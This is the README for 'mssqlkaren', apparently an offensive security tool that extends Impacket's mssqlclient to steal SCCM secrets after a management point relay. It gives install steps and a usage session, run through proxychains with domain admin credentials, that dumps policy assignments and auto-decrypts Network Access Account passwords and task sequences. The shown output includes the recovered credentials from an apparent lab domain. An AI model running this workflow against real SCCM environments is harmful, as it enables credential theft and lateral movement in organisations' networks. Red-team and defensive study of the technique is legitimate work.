# mssqlkaren


<p align="center">
<img width="600" height="400" alt="image" src="https://github.com/user-attachments/assets/ea210893-921b-46a6-a9d1-2b542dfb7880" />
</p>




## Updated mssqlclient.py to automate pulling policies after a mp relay to the sccm database shown [here](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)

## Installation

Requirements

```
uv
```

Install

```
git clone https://github.com/garrettfoster13/mssqlkaren.git
cd mssqlkaren
uv sync
```

## Usage
After the relay, proxy mssqlkaren.py and switch to the site database. Then just run `speak_to_the_manager` and the policy assignments and policies will be downloded and decoded to the `karen` dir in your cwd. If NAA or TaskSequence policies are found, will auto decrypt

```
proxychains uv run mssqlkaren.py ludus/domainadmin:password@10.6.10.13 -windows-auth
Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(sccm-sql): Line 1: Changed database context to 'master'.
[*] INFO(sccm-sql): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (ludus\domainadmin  dbo@master)> use cm_123
ENVCHANGE(DATABASE): Old Value: master, New Value: CM_123
INFO(sccm-sql): Line 1: Changed database context to 'CM_123'.
SQL (ludus\domainadmin  dbo@CM_123)> speak_to_the_manager
[*] Querying for x64 unknown computer guid
[*] Querying for Policy Assignments
[*] Querying for policy bodies
[+] Found NAA Policy
[!] Network Access Account Username: 'ludus\sccm_naa'
[!] Network Access Account Password: 'Password123'
[+] Found NAA Policy
[!] Network Access Account Username: 'ludus\sccm_naa'
[!] Network Access Account Password: 'Password123'
[+] Found Task Sequence policy
[!] successfully deobfuscated task sequence
[+] task sequence policy saved to karen/deobfuscated/ts_sequence_63d5e5da02c2f5d4176a72669aee4da4.xml
[+] Found Task Sequence policy
[!] successfully deobfuscated task sequence
[+] task sequence policy saved to karen/deobfuscated/ts_sequence_63d5e5da02c2f5d4176a72669aee4da4.xml
[+] Found Task Sequence policy
```
